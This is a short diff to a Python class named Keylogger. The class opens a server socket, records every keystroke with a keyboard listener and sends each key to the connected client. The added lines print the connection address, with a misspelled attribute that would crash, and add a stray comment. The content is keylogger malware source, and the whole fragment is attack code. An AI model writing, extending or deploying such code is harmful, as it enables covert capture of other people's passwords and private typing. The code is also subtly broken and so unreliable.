@@ -34,10 +34,13 @@ class Keylogger:
         self.server_socket.listen(1)
 
         self.conn, self.address = self.server_socket.accept()
+        print("Connection from: " + str(self.addres))
+
         self.listener = keyboard.Listener(on_press=self.log)
         self.listener.start()
 
     def log(self, key):
+        # while
         print(key + "   key")
         self.conn.send(str(key).encode())
 
